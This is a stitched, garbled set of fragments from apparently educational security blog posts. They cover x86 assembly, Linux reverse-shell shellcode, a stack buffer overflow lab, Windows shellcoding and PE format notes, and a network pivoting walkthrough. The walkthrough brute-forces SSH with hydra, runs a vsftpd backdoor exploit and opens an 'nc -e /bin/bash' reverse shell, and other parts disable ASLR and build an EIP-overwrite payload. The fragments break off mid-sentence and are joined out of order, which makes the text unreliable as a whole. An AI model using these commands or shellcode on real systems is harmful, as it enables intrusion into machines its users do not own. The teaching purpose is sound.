Because of its physical nature, hardware cannot be easily manipulated by software.    \n\n**MICROCODE** - also known as firmware. Microcode operates only on the exact circuitry for which it was designed. It contains microinstructions that translate from the higher machine-code level to provide a way to interface with the hardware.    \n\n**MACHINE CODE** - the machine code level consists of opcodes, hexadecimal digits that tell the processor what you want it to do. It's not just one language called machine code. It's many different kinds of machine code. Just as we speak different languages as people, machines speak different languages.         \n\n**LOW-LEVEL LANGUAGES** - a low-level languages is a human-readable version of a computer architecture's instruction set. The most common low-level language is assembly language. Assembly language which corresponds to the different architectures is by far the most important tool in any malware analyst's toolkit.         \n\n**HIGH-LEVEL LANGUAGES** - Most computer programmers include who write malware, operate at the level of high-level languages. High-level languages provide strong abstraction from the machine level and make it easy to use programming logic and flow-control mechanisms.           \n\n**INTERPRETED LANGUAGES** - Interpreted languages are at the top level. The code at this level is not compiled into machine code, instead, it is translated into bytecode. Bytecode executes within an interpreter, which is a program that translates bytecode into executable machine code on the fly at runtime. For example, python. Python is well suited for quick malware analysis. For example, a library such as [pefile](https://github.com/erocarrera/pefile). In one of the following posts I will show an example of using this library.    \n\nThe term *\"reverse engineering\"* has several popular meanings. In my case, I am considering researching compiled programs (malware). When we disassemble malware, we take the malware bin as input then we generate assembly language code as output, usually with a disassembler.     \n\nI think many more experienced malware analysts will agree with me if I start with a short introduction to assembly language x86.      \n\n### the x86 architecture\n\nAt this time there two main architectures that indicate how our programs is compiled and executed: 32-bit and 64-bit. We will be going over the 32-bit architecture (x86) and 32-bit (x86) assembly language.                \n\nThe internals of most modern computers architectures, including x86, follow the Von Neumann architecture:          \n**CPU** (Central Processing Unit) - executes code.    \n**RAM** - the main memory of the system stores all data and node.    \n**I/O** - an input/output system interfaces with devices such as hard drives, keyboards, printers etc.    \n\nAs you can see CPU contains several components:             \nThe *control unit* gets instructions to execute from RAM using a *register* - the *instruction pointer*, which stores the address of the instruction to execute.     \n\n*Registers* - Registers are small memory storage areas built into the processor (still volatile memory).     \nThere are 8 \"general purpose\" registers:      \n**EAX** - stores function return values          \n**EBX** - base pointer to the data section    \n**ECX** - counter for string and loop operations     \n**EDX** - I/O pointer            \n**ESI** - source pointer for string operations          \n**EDI** - destination pointer for string operations         \n**ESP** - stack pointer             \n**EBP** - stack frame base pointer        \n\nAnd instruction pointer:       \n**EIP** - pointer to next instruction to execute - *\"instruction pointer\"*      \n\nThe ALU - Arithmetic logic unit executes an instruction fetched from RAM and places the results in registers or memory. The process of fetching and executing instruction after \ninstruction is repeated as a program runs.     \n\nThe main memory **RAM** for a single program can be divided into the following 4 main sections:    \n\nThe **Data** section contains values that are put in place when a program is initially loaded.    \n**Code** includes the instructions fetched by the CPU to execute the program's tasks.   \n**Heap** is used for dynamic memory during program execution, to allocate new values (for example `malloc()` and `calloc()` functions in C) and eliminate (for e"

copy b to a\nand a, b   ; copy \"a logical AND b\" to a\nor  a, b   ; copy \"a logical OR b\" to a\nxor a, b   ; copy \"a logical XOR b\" to a\nadd a, b   ; copy a + b to a\nsub a, b   ; copy a - b to a\ninc a      ; increment a (copy a + 1 to a)\ndec a      ; decrement a (copy a - 1 to a)\ndb         ; pseudo-instruction that declares bytes\n           ; will be in memory when the program runs\n```\n\nAs i wrote earlier, in fact, most of the basic instructions have only the following forms: \n\n```nasm\nmov eax, ebx      ; copy register to register\nmov ebx, [123]    ; copy memory address to register\nmov [123], eax    ; copy register to memory address\nmov eax, 0x12     ; copy immediate to register\nmov [151], 0x55   ; copy immediate to memory address\n```\n\nPseudo-instructions are things which, though not real x86 machine instructions, are used in the instruction field anyway because that's the most convenient place to put them:\n\n```nasm\ndb    0x55                ; just the byte 0x55\ndb    0x55,0x56,0x57      ; three bytes in succession\ndb    'a',0x55            ; character constants are OK\ndb    'hello',13,10,'$'   ; so are string constants\ndw    0x1234              ; 0x34 0x12\ndw    'a'                 ; 0x61 0x00 (it's just a number)\ndw    'ab'                ; 0x61 0x62 (character constant)\ndw    'abc'               ; 0x61 0x62 0x63 0x00 (string)\ndd    0x12345678          ; 0x78 0x56 0x34 0x12\ndd    1.234567e20         ; floating-point constant\ndq    0x123456789abcdef0  ; eight byte constant\ndq    1.234567e20         ; double-precision float\ndt    1.234567e20         ; extended-precision float\n```\n\nTo reserve space (without initializing), you can use the following pseudo instructions. They should go in a section called `.bss` (you'll get an error if you try to use them in a `.text` section):               \n\n```nasm\nbuffer:     resb  64  ; reserve 64 bytes\nwordvar:    resw  1   ; reserve a word\nrealarray:  resq  10  ; array of ten reals\n```\n\n### hello world       \n\nSo what about our first practical example? Let's start with the classic \"Hello world\" program:\n\n```nasm\n; hello.asm: writes \"hello world\" to the console.\n; author:    @cocomelonc\n; run:\n; nasm -f elf32 -o hello.o hello.asm\n; ld -m elf_i386 -o hello hello.o && ./hello\n; 32-bit linux\n\nsection .text\n  global _start\n\n_start:\n  mov eax, 0x4              ; system call for write\n  mov ebx, 1                ; file handle 1 is stdout\n  mov ecx, msg              ; address of string to output\n  mov edx, 12               ; number of bytes\n  int 0x80                  ; call kernel\n\n_exit:\n  mov eax, 0x1              ; sys_exit system call\n  mov ebx, 0                ; exit code 0 successfull exec\n  int 0x80                  ; call sys_exit\n\nsection .data\n  msg: db \"hello world\", 10 ; note the newline at the end\n\n``` \n\nCompile and run:\n```bash\nnasm -f elf32 -o hello.o hello.asm\nld -m elf_i386 -o hello hello.o\n./hello\n```\n\n     \n\nAs you can see everything work as expected. Our program writes \"hello world\" to the console using only system calls. Let's examine lines 12-16:\n\n     \n\nEverything is written in the comments to my code:              \nline 12: system call for write.             \nline 13: file descriptor (stdout).     \nline 14: message \"hello world\".     \nline 15: number of bytes.         \nline 16: system interrupt call.           \n\nAs for lines 19-21:\n\n    \n\nthey are identical to the logic from an example from [first post](/tutorial/2021/10/03/malware-analysis-1.html), it's just normal exit logic.    \n\nI hope you haven't forgotten about the instruction `int 0x80`. There is an `int 0x80` instruction in the assembler code. This is a system interrupt. When the processor receives interrupt `0x80`, it performs the requested system call in kernel mode, while getting the desired handler from the Interrupt Descriptor Table.        \n\n### hello world via using C library            \n\nLet's go to code our \"hello world\" example with using C library. Remember how in C execution “starts” at the function `main`? That’s because the C library actually has the `_start` label inside itself! The code at `_start` does some initialization, then it calls `main`, then it does some clean up, then it issues the system call for exit. So you just have to implement `main`. We can do that in assembly!     \n\n```nasm\n; hello.asm: writes \"hello world\" to the console by using C lib.\n; author:    @cocomelonc\n; run:\n; nasm -f elf32 -o hello2.o hello2.asm\n; gcc -static -m32 -o hello2 hello2.o && ./hello2\n; 32-bit linux\n\nsection .text\nglobal main\nextern puts\n\nmain:                        ; called by C lib startup code\n  push msg                   ; address of string to output\n  call puts                  ; puts (msg)\n  add esp, 4                 ; update stack pointer (1 argument 4 byte)\n  xor eax, eax               ; a faster way of setting eax to zero\n  ret                        ; return from main back into C library wrapper\n\nmsg: db \"hello world\", 0     ; note strings must be terminated with 0 in C\n```\n\nwhich is equivalent in C:\n```cpp\n#include \n\nint main(void) {\n  puts (\"hello world\");\n  return 0;\n}\n```\n\nI think from the comments to the code everything should be clear, this is a simplest example:        \n\non line 14, a call to the `puts()` function: `call puts`. Because in real cases shellcode can be a code that is injected into a running program to make it do something it was not made to do, for example buffer overflow attacks. So shellcode is generally can be used as the “payload” of an exploit.            \n\nWhy the name \"shellcode\"? Historically, shellcode is machine code that when executed spawns a shell.        \n\n### testing shellcode     \n\nWhen testing shellcode, it is nice to just plop it into a program and let it run. The C program below will be used to test all of our code (`run.c`):           \n```cpp\n/*\nrun.c - a small skeleton program to run shellcode\n*/\n// bytecode here\nchar code[] = \"my shellcode here\";\n\nint main(int argc, char **argv) {\n  int (*func)();             // function pointer\n  func = (int (*)()) code;   // func points to our shellcode\n  (int)(*func)();            // execute a function code[]\n  // if our program returned 0 instead of 1, \n  // so our shellcode worked\n  return 1;\n}\n```\n\nKnowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus. You can ofcourse try to learn what they mean from this tutorial, but it’s better to take your time to learn about these from a more in depth source.         \n\n### disable ASLR\nAddress Space Layout Randomization (ASLR) is a security features used in most operating system today. ASLR randomly arranges the address spaces of processes, including stack, heap, and libraries. It provides a mechanism for making the exploitation hard to success. You can configure ASLR in Linux using the `/proc/sys/kernel/randomize_va_space` interface.\n\nThe following values are supported:\n* 0 - no randomization\n* 1 - conservative randomization\n* 2 - full randomization\n\nTo disable ASLR, run:\n```bash\necho 0 > /proc/sys/kernel/randomize_va_space\n```\n\nenable ASLR, run:\n```bash\necho 2 > /proc/sys/kernel/randomize_va_space \n```\n\n### some assembly\n\nFirstly, let's repeat some more introductory information, please be patient.     \n\nThe x86 Intel Register Set.            \n\n    EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers.           \n    AH, BH, CH and DH access the upper 16-bits of the General Purpose Registers.       \n    AL, BL, CL, and DL access the lower 8-bits of the General Purpose Registers.        \n    EAX, AX, AH and AL are called the \"Accumulator\" registers and can be used for I/O port access, arithmetic, interrupt calls etc.  We can use these registers to implement system calls.       \n    EBX, BX, BH, and BL are the \"Base\" registers and are used as base pointers for memory access. We will use this register to store pointers in for arguments of system calls. This register is also sometimes used to store return value from an interrupt in.            \n    ECX, CX, CH, and CL are also known as the \"Counter\" registers.          \n    EDX, DX, DH, and DL are called the \"Data\" registers and can be used for I/O port access, arithmetic and some interrupt calls.             \n\nAssembly instructions. There are some instructions that are important in assembly programming:  \n```nasm\nmov  eax, 32       ; assign: eax = 32\nxor  eax, eax      ; exclusive OR\npush eax           ; push something onto the stack\npop  ebx           ; pop something from the stack (what was on the stack in a register/variable)\ncall mysuperfunc   ; call a function\nint  0x80          ; interrupt, kernel command\n```\n\nLinux system calls. System calls are APIs for the interface between the user space and the kernel space. You can make use of Linux system calls in your assembly programs. You need to take the following steps for using Linux system calls in your program:\n\n    Put the system call number in the EAX register.\n    Store the arguments to the system call in the registers EBX, ECX, etc.\n    Call the relevant interrupt (80h).\n    The result is usually returned in the EAX register.\n\nAll the x86 syscalls are listed in `/usr/include/asm/unistd_32.h`.    \n\nExample of how libc wraps syscalls:     \n```cpp\n/*\nexit0.c - for demonstrating \nhow libc wraps syscalls\n*/\n#include \n\nvoid main() {\n  exit(0);\n}\n```\n\nLet's go to compile and disassembly:\n```bash\ngcc -masm=intel -static -m32 -o exit0 exit0.c\ngdb -q ./exit0\n```\n\n    \n\n`0xfc = exit_group()` and `0x1 = exit()`\n\n### nullbytes\n\nFirst of all, I want to draw your attention to nullbytes.      \nLet's go to investigate simple program:      \n```cpp\n/*\nmeow.c - demonstrate nullbytes\n*/\n#include \nint main(void) {\n    printf (\"=^..^= meow \\x00 meow\");\n    return 0;\n}\n```\n\ncompile and run:\n```bash\ngcc -m32 -w -o meow meow.c\n./meow\n```\n\n  \n\nAs you can see, a nullbyte `\\x00` terminated the chain of instructions. \n\nThe exploits usually attack C code, and therefore the shell code often needs to be delivered in a NUL-terminated string. If the shell code contains NUL bytes the C code that is being exploited might ignore and drop rest of the code starting from the first zero byte.\n\nThis concerns only the machine code. If you need to call the system call with number `0xb`, then naturally you need to be able to produce the number `0xb` in the `EAX` register, but you can only use those forms of machine code that do not contain zero bytes in the machine code itself.\n\nLet's go to compile and run two equivalent code.         \nFirst `exit1.asm`:                   \n```nasm\n; just normal exit\n; author @cocomelonc\n; nasm -f elf32 -o exit1.o exit1.asm\n; ld -m elf_i386 -o exit1 exit1.o && ./exit1\n; 32-bit linux\n\nsection .data\n\nsection .bss\n\nsection .text\n  global _start   ; must be declared for linker\n\n; normal exit\n_start:           ; linker entry point\n  mov eax, 0      ; zero out eax\n  mov eax, 1      ; sys_exit system call\n  int 0x80        ; call sys_exit\n```\n\ncompile and investiga"

i  jmp to dup\n```\n\n`jns` basically jumps to \"dup\" as long as the signed flag (`SF`) is not set.   \n\nLet's go to debug with `gdb` and check `ecx` value:   \n```bash\ngdb -q ./rev\n```\n\n       \n\nAs you can see, after third `dec ecx` it contains `0xffffffff` which is equal -1 and the `SF` got set and the shellcode flow continues.     \n\nIn result, all three output are redirected :)       \n\n### launch the shell with execve\n\nThis part of code are similar to the example from the first part, but again with a small change:\n```nasm\n; socket_type = SOCK_STREAM (0x1)\n  push 0x2         ; socket_family = AF_INET (0x2)\n  mov  ecx, esp    ; move stack pointer to ecx\n  int  0x80        ; syscall (exec sys_socket)\n  xchg edx, eax    ; save result (sockfd) for later usage\n\n  ; int socketcall(int call, unsigned long *args);\n  mov  al, 0x66    ; socketcall 102\n\n  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);\n  push 0x0101017f  ; sin_addr = 127.1.1.1 (network byte order)\n  push word 0x5c11 ; sin_port = 4444\n  inc  ebx         ; ebx = 0x02\n  push word bx     ; sin_family = AF_INET\n  mov  ecx, esp    ; move stack pointer to sockaddr struct\n\n  push 0x10        ; addrlen = 16\n  push ecx         ; const struct sockaddr *addr\n  push edx         ; sockfd\n  mov  ecx, esp    ; move stack pointer to ecx (sockaddr_in struct)\n  inc  ebx         ; sys_connect (0x3)\n  int  0x80        ; set counter to 2\n  pop  ecx         ; zero to ecx (reset for newfd loop)\n  xchg ebx, edx    ; save sockfd\n\ndup:\n  mov  al, 0x3f    ; sys_dup2 = 63 = 0x3f\n  int  0x80        ; syscall (exec sys_dup2)\n  dec  ecx         ;       "title": "Buffer overflow - part 1. Linux stack smashing",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!           \n\n          \n\n### buffer overflow\n\nA stack buffer overflow occurs when a program writes more data to the stack than has been allocated to the buffer. This leads to overwriting of possibly important redundant data in the stack and causes an abnormal termination or execution by arbitrary overwriting of the instruction pointer `eip` and, therefore, allows the execution of the program flow to be redirected.     \n\n### vulnerable program example      \n\nBefore compile any vulnerable code, let's see what needs for successfully exploitation. If you reboot your machine during the exploitation, you will have to disable ASLR:\n```bash\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n```\nafter every reboot.          \n\nLet's go to consider vulnerable program (`vuln.c`):\n```cpp\n#include \n#include \n#include \n\nint overflow(char *input) {\n  char buf[256];\n  strcpy(buf, input);\n  return 1;\n}\n\nint main(int argc, char *argv[]) {\n  overflow(argv[1]);\n  printf(\"meow =^..^=\\n\");\n  return 1;\n}\n\n```\n\nIt is not so difficult to see that the above program can be hacked by a buffer overflow.     \nThis program is unsecure. Let's analysze it. Starting from `main()` function. It calls the `overflow` function. The `overflow` declare a variable that is `256` bytes wide. It copies the string from user input (including the null character) to this variable.     \n\nFunctions like `read()`, `gets()`, `strcpy()` do not check the length of the input strings relative to the size of the destination buffer - exactly the condition we are looking to exploit.          \n\nLet's compile the program:         \n```bash\ngcc -z execstack -fno-stack-protector -m32 -o vuln vuln.c\n```\n\n          \n\n> `-fno-stack-protector` disables the compiler's protection against Stack Smashing attacks, which are one of the scenarios for exploiting a buffer overflow vulnerability. This kind of protection is usually understood to mean a small expansion of the stack space to be placed immediately before the return address of a generated integer (guard variable or canary by analogy with the use of random firedamp in mines), not known to the intruder. If this value has changed before returning from the function, it means that there is a high probability that there was interference from the outside, and the return address was damaged / replaced. Therefore, it is necessary to stop the execution of the program. The `-z execstack` keyword means that instructions located on the stack can be executed. `-m32` - explicitly emphasizes that we want a 32-bit executable.        \n\nThe program requires manual input of the characters. First of all, we can try entry few characters only for checking correctness. After that let's try to entry a lot of characters for crashing:\n```bash\n./vuln meowmeow\n./vuln woofwoof\n./vuln $(python -c 'print(\"A\" * 400)')\n```\n\n          \n\nLet's go to debug via gdb:\n```bash\ngdb -q ./vuln\ngdb-peda$ r $(python3 -c 'print(\"A\" * 400)')\n```\n\n          \n          \n\n\"A\" in hex are `0x41`. As you can see due to supplying multiple \"A\"'s into the program buffer, they overflowed the stack and ended up in the `eip` register. The memory buffer has been filled and exceed. As we can see in the code above the buffer has a 256 bytes size. Now we need to find the offset for overwriting the `eip` register.      \n\nThere are various methods to calculate the offset from the beginning of the buffer to the `eip`. There are the `pattern_create.rb` and `pattern_offset.rb` tools shipped with `metasploit`. Also, pattern create is one of the PEDA utilities. They both work in the same way - creating a pattern of a unique string of a given length.     \n\n```bash\ngdb-peda$ pattern create 400\ngdb-peda$ r \n```\n\n          \n\nBased on the `eip` value (`0x41332541`), it's also possible to identify the correct offset to the `eip`:\n\n```bash\ngdb-peda$ pattern offset 0x41332541\n```\n\n          \n\nLet's use this value for create new input (which will serve as the base for our future payload) and run vulnerable binary with it:\n```bash\ngdb -q ./vuln\ngdb-peda$ r $(python3 -c 'print(\"A\" * 268 + \"B\" * 4)')\n```\n          \n\nPerfect! The `EIP` was overwritten with `BBBB` (`0x42424242`), so we've gained control over `EIP`.           \n\n### identification bad chars       \n\nIn order to run, the shellcode can't contain characters that will be interpreted incorrectly by the program you are exploiting, such as newline, for example. These chars also known as ***bad characters***, like this:\n- `\\x00` - Null Byte          \n- `\\x0A` - Line Feed             \n- `\\x0D` - Carriage Return               \n- `\\xFF` - Form Feed            \n\nThe easiest way to determine which of the characters are bad for our shellcode is to run them in it. The Windows kernel is completely different from the Linux kernel. At the very beginning of our program, we have `#include `, which in turn means that the windows library will be included in the code and this will dynamically link dependencies by default. However, we cannot do the same with ASM. In the case of ASM, we need to find the location of the [WinExec](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) function, load the arguments onto the stack, and call the register that has a pointer to the function. Likewise for the [ExitProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) function. It is important to know that most windows functions are available from three main libraries: `ntdll.dll`, `Kernel32.DLL` and `KernelBase.dll`. If you run our example in a debugger (`x32dbg` in my case), you can make sure of this:          \n\n          \n\n### finding function's addresses\n\nSo, we need to know the `WinExec` address in memory. We'll find it!       \n\n```cpp\n/*\ngetaddr.c - get addresses of functions \n(ExitProcess, WinExec) in memory\n*/\n#include \n#include \n\nint main() {\n  unsigned long Kernel32Addr;      // kernel32.dll address\n  unsigned long ExitProcessAddr;   // ExitProcess address\n  unsigned long WinExecAddr;       // WinExec address\n\n  Kernel32Addr = GetModuleHandle(\"kernel32.dll\");\n  printf(\"KERNEL32 address in memory: 0x%08p\\n\", Kernel32Addr);\n\n  ExitProcessAddr = GetProcAddress(Kernel32Addr, \"ExitProcess\");\n  printf(\"ExitProcess address in memory is: 0x%08p\\n\", ExitProcessAddr);\n\n  WinExecAddr = GetProcAddress(Kernel32Addr, \"WinExec\");\n  printf(\"WinExec address in memory is: 0x%08p\\n\", WinExecAddr);\n\n  getchar();\n  return 0;\n}\n```\n\nThis program will tell you the kernel address and the `WinExec` address in `kernel32.dll`. Let's compile it:               \n```bash\ni686-w64-mingw32-gcc -O2 getaddr.c -o getaddr.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wall -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1\n```\n\n          \n\nand run in our target machine:\n```cmd\n.\\getaddr.exe\n```\n\n          \n\nNow we know the addresses of our functions.       "ref": "2021-10-30-windows-shellcoding-2",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!           \n\n         \n\nIn the [first](/tutorial/2021/10/27/windows-shellcoding-1.html) part of my post about windows shellcoding we found the addresses of `kernel32` and functions using the following logic:\n```cpp\n/*\ngetaddr.c - get addresses of functions\n(ExitProcess, WinExec) in memory\n*/\n#include \n#include \n\nint main() {\n  unsigned long Kernel32Addr;      // kernel32.dll address\n  unsigned long ExitProcessAddr;   // ExitProcess address\n  unsigned long WinExecAddr;       // WinExec address\n\n  Kernel32Addr = GetModuleHandle(\"kernel32.dll\");\n  printf(\"KERNEL32 address in memory: 0x%08p\\n\", Kernel32Addr);\n\n  ExitProcessAddr = GetProcAddress(Kernel32Addr, \"ExitProcess\");\n  printf(\"ExitProcess address in memory is: 0x%08p\\n\", ExitProcessAddr);\n\n  WinExecAddr = GetProcAddress(Kernel32Addr, \"WinExec\");\n  printf(\"WinExec address in memory is: 0x%08p\\n\", WinExecAddr);\n\n  getchar();\n  return 0;\n}\n```\n\nThen we entered the found address into our shellcode:\n```nasm\n; void ExitProcess([in] UINT uExitCode);\nxor  eax, eax         ; zero out eax\npush eax              ; push NULL\nmov  eax, 0x76ed214f  ; call ExitProcess function addr in kernel32.dll\njmp  eax              ; execute the ExitProcess function\n```\n\nThe caveat is that the addresses of all DLLs and their functions change upon reboot and differ in each system. For this reason, we cannot hard-code any addresses in our ASM code:        \n\n        \n\nFirst of all, how do we find the address of `kernel32.dll`?         \n\n### TEB and PEB structures\n\nWhenever we execute any exe file, the first thing that is created (at least to my knowledge) in the OS are [PEB](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb):                  \n```cpp\ntypedef struct _PEB {\n  BYTE                          Reserved1[2];\n  BYTE                          BeingDebugged;\n  BYTE                          Reserved2[1];\n  PVOID                         Reserved3[2];\n  PPEB_LDR_DATA                 Ldr;\n  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;\n  PVOID                         Reserved4[3];\n  PVOID                         AtlThunkSListPtr;\n  PVOID                         Reserved5;\n  ULONG                         Reserved6;\n  PVOID                         Reserved7;\n  ULONG                         Reserved8;\n  ULONG                         AtlThunkSListPtr32;\n  PVOID                         Reserved9[45];\n  BYTE                          Reserved10[96];\n  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;\n  BYTE                          Reserved11[128];\n  PVOID                         Reserved12[1];\n  ULONG                         SessionId;\n} PEB, *PPEB;\n```\n\nand [TEB](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb):        \n\n```cpp\ntypedef struct _TEB {\n  PVOID Reserved1[12];\n  PPEB  ProcessEnvironmentBlock;\n  PVOID Reserved2[399];\n  BYTE  Reserved3[1952];\n  PVOID TlsSlots[64];\n  BYTE  Reserved4[8];\n  PVOID Reserved5[26];\n  PVOID ReservedForOle;\n  PVOID Reserved6[4];\n  PVOID TlsExpansionSlots;\n} TEB, *PTEB;\n```\n\n`PEB` - process structure in windows, filled in by the loader at the stage of process creation, which contains the information necessary for the functioning of the process.     \n\n`TEB` is a structure that is used to store information about threads in the current process, each thread has its own TEB.        \n\nLet's open some program in the windbg debugger and run command:\n```cmd\ndt _teb\n```\n\n        \n\nAs we can see, PEB has an offset of `0x030`. This one is overview of PE file format.           \n\n### PE file\n\nWhat is PE file format? It's the native file format of Win32. Its specification is derived somewhat from the Unix Coff (common object file format). The meaning of \"portable executable\" is that the file format is universal across win32 platform: the PE loader of every win32 platform recognizes and uses this file format even when Windows is running on CPU platforms other than Intel. It doesn't mean your PE executables would be able to port to other CPU platforms without change. Thus studying the PE file format gives you valuable insights into the structure of Windows.     \n\nBasically PE file structure looks like this:                     \n\n         \n\nThe PE File Format is essentially defined by the PE Header so you will want to read about that first, you don't need to understand every single part of it but you should get an idea about it's structure and be able to identify the parts that are most important.\n\n## DOS header\n\nDOS header store the information needed to load the PE file. Therefore, this header is mandatory for loading a PE file.            \n\nDOS header structure:          \n```cpp\ntypedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header\n    WORD   e_magic;                     // Magic number\n    WORD   e_cblp;                      // Bytes on last page of file\n    WORD   e_cp;                        // Pages in file\n    WORD   e_crlc;                      // Relocations\n    WORD   e_cparhdr;                   // Size of header in paragraphs\n    WORD   e_minalloc;                  // Minimum extra paragraphs needed\n    WORD   e_maxalloc;                  // Maximum extra paragraphs needed\n    WORD   e_ss;                        // Initial (relative) SS value\n    WORD   e_sp;                        // Initial SP value\n    WORD   e_csum;                      // Checksum\n    WORD   e_ip;                        // Initial IP value\n    WORD   e_cs;                        // Initial (relative) CS value\n    WORD   e_lfarlc;                    // File address of relocation table\n    WORD   e_ovno;                      // Overlay number\n    WORD   e_res[4];                    // Reserved words\n    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)\n    WORD   e_oeminfo;                   // OEM information; e_oemid specific\n    WORD   e_res2[10];                  // Reserved words\n    LONG   e_lfanew;                    // File address of new exe header\n  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;\n```\n\nand it is `64` bytes in size. In this structure, the most important fields are `e_magic` and `e_lfanew`. The first two bytes of the header are the magic bytes which identify the file type, `4D 5A` or \"MZ\" which are the initials of Mark Zbikowski who worked on DOS at Microsoft. These magic bytes define it as a PE file:\n\n         \n\n`e_lfanew` - is at offset `0x3c` of the DOS HEADER and contains the offset to the PE header:\n\n         \n\n### DOS stub\n\nAfter the first `64` bytes of the file, a dos stub starts. This area in memory is mostly filled with zeros:     \n\n         \n\n### PE header\n\nThis portion is small and simply contains a file signature which are the magic bytes `PE\\0\\0` or `50 45 00 00`:\n\n         \n\nIt's structure:        \n```cpp\ntypedef struct _IMAGE_NT_HEADERS {\n    DWORD Signature;\n    IMAGE_FILE_HEADER FileHeader;\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader;\n} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n```\n\nLet's take a closer look at this structure.        \n\n**File Header** (or COFF Header) - a set of fields describing the basic characteristics of the file:       \n```cpp\ntypedef struct _IMAGE_FILE_HEADER {\n    WORD    Machine;\n    WORD    NumberOfSections;\n    DWORD   TimeDateStamp;\n    DWORD   PointerToSymbolTable;\n    DWORD   NumberOfSymbols;\n    WORD    SizeOfOptionalHeader;\n    WORD    Characteristics;\n} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n```\n\n         \n\n**Optional Header** - it's optional in context of COFF object files but not PE files. It contains many important variables such as `AddressOfEntryPoint`, `ImageBase`, `Section Alignment`, `SizeOfImage`, `SizeOfHeaders` and the `DataDirectory`.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!           \n\n         \n\nThis article will consider scenarios for attacking protected segments of a corporate network using pivoting techniques. I will focus on a practical example.        \n\n### pivoting\n\nPivoting is a technique by which access is organized to those networks to which we do not have access under normal circumstances and obtained using compromised computers. Network isolation will be useless if we compromise a host that has access to all isolated subnets. Thus, an attacker can use the routing capabilities of a compromised machine to access internal corporate resources.            \n\nI will show with an example how an attacker can gain access to a \"hidden\" network without having direct access to it in the early stages of penetration testing using pivot techniques.       \n\n### scenario\n\nLet's consider at this network topology:       \n\n         \n\n### enum and compromise machine A\n\nFirstly, scan ports:          \n```bash\nnmap -Pn -sV 10.9.1.11\n```\n\n         \n\nAs you can see SSH port `22` is open.     \n\nLet's go to brute via `hydra`:        \n```bash\nhydra -f -v -V -l root -P rockyou-15.txt -s 22 ssh://10.9.1.11 -t 2\n```\n\n         \n\n### ssh port forward\n\nCheck network interfaces on machine `A`:        \n```bash\nifconfig\n```\n\n         \n\nAs you can see we discover another network `7.7.1.0/24`.\n\nFurther, according to the scenario, the attacker wants to gain access to the subnet behind the `7.7.7.0/24` interface. To do this, he needs to use a compromised host as a pivot.     \n\nIn a compromised host, we cannot use `nmap` for port scanning, so use `netcat`:      \n```bash\nnc -zv -w1 7.7.1.5 1-100\n```\n\n         \n\nthen banner grabbling via netcat:\n```bash\nnc 7.7.1.5 21\n```\n\n         \n\nWe found a vulnerable `21` port:     \n\n[https://www.exploit-db.com/exploits/49757](https://www.exploit-db.com/exploits/49757)\n\nfor exploitation `7.7.1.5` we use ssh tunnel:             \n\n```bash\nssh -L 10.9.1.6:8021:7.7.1.5:21 -L 10.9.1.6:6200:7.7.1.5:6200 root@10.9.1.11\n```\n\n         \n\nSo what we do in here? We forwarded ports from attacker's machine to victim machine `B` via compromised machine `A` - `10.9.1.11`:      \n\n         \n\nWhy `6200` port? Because, backdoor use this port.        \n\n### exploit and access machine B\n\nFor exploitation machine `B` with address `7.7.1.5`, we'll download python exploit for `vsftpd 2.3.4` backdoor:             \n[https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py](https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)           \n\nDownload and run:\n```bash\npython3 vsftpd_234_exploit.py 10.9.1.6 8021 whoami\n```\n\n         \n\nIt's ok, but we cannot start the reverse shell because we do not have a reverse route.     \n\ncreate back port forwarding for our reverse shell.\n\non machine `A` run:\n```bash\nnc -l -p 3333 -c \"nc 10.9.1.6 3333\"\n```\n\n         \n\nand prepare listener on attacker machine:\n```bash\nnc -nlvp 3333\n```\n\n         \n\nSo what we do in here? Port forwarding is one of the basic steps during tunneling. This technique is used when the service within the detected network is not directly accessible. This is because our routing is unidirectional. We know how to access the internal service, but the service does not have an appropriate route to the attacker's machine. Therefore, we will redirect the all incoming connections to `3333` port from machine `A` to attacker's machine (on `3333` port):    \n\n         \n\non attacker machine run exploit with netcat reverse shell:\n```bash\npython3 vsftpd_234_exploit.py 10.9.1.6 8021 \"nc -e /bin/bash 7.7.1.9 3333\"\n```\n\n         \n\n         \n\ncheck our listener:         \n\n         \n\n         \n\n**So, the machine B has been pwned :)**\n\n### conclusion\n\nThe attacker discovered secret network by following the steps below:              \n\n- attacker got an access to the `machine A (10.9.1.11)`  which was on same network with attacker via brute `SSH` via `hydra`              \n- then he realise that `machine A` has 2 network interfaces           \n- scan ports on `machine B` via `nc` from `machine A`                \n- then attacker banner grabbling on port `21` on `machine B` with IP address `7.7.1.5`         \n- `machine B` have vulnerable `vsftpd 2.3.4` on port `21`              \n- reverse port forward via `nc` on `A` for back connect from `B` to attacker machine    \n- successfully exploitation of `vsftpd 2.3.4` via python exploit - create reverse shell via `3333` port    \n- final    \n\nIn the next part I will go to consider an example which use `proxychains` and `metasploit` for pivoting.          \n\n> This is a practical case for educational purposes only.      \n\nThanks for your time, happy hacking and good bye!    \n*PS.       "title": "Classic DLL injection via SetWindowsHookEx. Simple C++ malware.",

